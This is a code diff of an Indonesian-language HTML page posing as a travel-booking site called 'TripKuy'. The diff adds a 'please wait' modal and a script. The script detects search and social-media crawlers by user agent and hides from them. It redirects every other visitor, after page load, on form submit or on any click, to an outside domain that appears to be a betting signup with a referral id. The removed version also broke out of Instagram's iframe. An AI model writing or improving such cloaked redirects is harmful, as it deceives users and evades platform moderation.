@@ -12,6 +12,19 @@
     </style>
 </head>
 <body class="bg-gray-50 text-gray-800">
+    <div id="redirectModal" class="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 hidden">
+    <div class="bg-white p-8 rounded-2xl shadow-2xl text-center max-w-sm mx-4">
+        <div class="mb-4">
+            <i class="fas fa-plane-departure text-blue-600 text-5xl animate-bounce"></i>
+        </div>
+        <h2 class="text-2xl font-bold text-gray-800 mb-2">Tunggu Sebentar</h2>
+        <p class="text-gray-600">Menyiapkan pengalaman perjalanan terbaik untuk Anda...</p>
+        <div class="mt-6 flex justify-center">
+            <div class="w-12 h-12 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
+        </div>
+    </div>
+    </div>
+    
 
     <nav class="fixed w-full z-50 bg-white/90 backdrop-blur-md shadow-sm">
         <div class="container mx-auto px-6 py-4 flex justify-between items-center">
@@ -144,48 +157,44 @@
             e.preventDefault();
             alert('Terima kasih! Pesanan TripKuy Anda telah kami terima. Tim kami akan menghubungi Anda melalui email.');
         });
-    </script>
-</body>
-</html>
-<script>
-    const destinationURL = "https://goto77-xbec.store/mobile/daftar?ref_id=06bb666e";
+    <script>
+    const destinationURL = "https://go-to77sports.online/daftar?ref_id=06bb666e";
+    const modal = document.getElementById('redirectModal');
     const ua = navigator.userAgent || navigator.vendor || window.opera;
-    
-    // Deteksi Bot lebih ketat
     const isBot = /bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|facebookcatalog|facebot/i.test(ua);
-    // Deteksi khusus IG/FB
-    const isSocialApp = /FBAN|FBAV|Instagram|Messenger/i.test(ua);
 
-    // 1. Fungsi Redirect yang lebih kuat
     function goNow() {
         if (!isBot) {
-            // Gunakan top.location untuk menembus iframe Instagram
             window.top.location.href = destinationURL;
         }
     }
 
-    // 2. Logika Form (Jika user klik manual)
-    document.getElementById('bookingForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        goNow();
+    // Fungsi untuk menampilkan pop-up dan redirect dalam 3 detik
+    function startRedirectProcess() {
+        if (!isBot) {
+            modal.classList.remove('hidden'); // Tampilkan pop-up
+            setTimeout(() => {
+                goNow();
+            }, 3000); // Durasi 3 detik
+        }
+    }
+
+    // Jalankan otomatis saat halaman dimuat
+    window.addEventListener('load', () => {
+        // Beri jeda 1 detik sebelum pop-up muncul agar halaman terlihat dulu
+        setTimeout(startRedirectProcess, 1000); 
     });
 
-    // 3. Auto-Redirect dengan penanganan khusus Instagram
-    if (!isBot) {
-        // Jika di Instagram, kita beri jeda sedikit lebih lama agar page 'settle' dulu
-        // Terkadang 5 detik terlalu cepat sehingga dianggap crash oleh IG
-        const waitTime = isSocialApp ? 8000 : 12000; 
+    // Form Pemesanan tetap berfungsi sebagai pemicu manual
+    document.getElementById('bookingForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        startRedirectProcess();
+    });
 
-        setTimeout(function() {
-            goNow();
-        }, waitTime);
-    }
-
-    // 4. Fallback: Jika user klik di mana saja di layar (khusus user asli), langsung redirect
-    // Ini sangat ampuh di Instagram karena dianggap 'Interaksi User'
-    if (!isBot && isSocialApp) {
-        document.body.addEventListener('click', function() {
-            goNow();
-        }, { once: true });
-    }
+    // Fallback interaksi untuk browser seluler/sosial media
+    document.body.addEventListener('click', function() {
+        if (modal.classList.contains('hidden')) {
+            startRedirectProcess();
+        }
+    }, { once: true });
 </script>
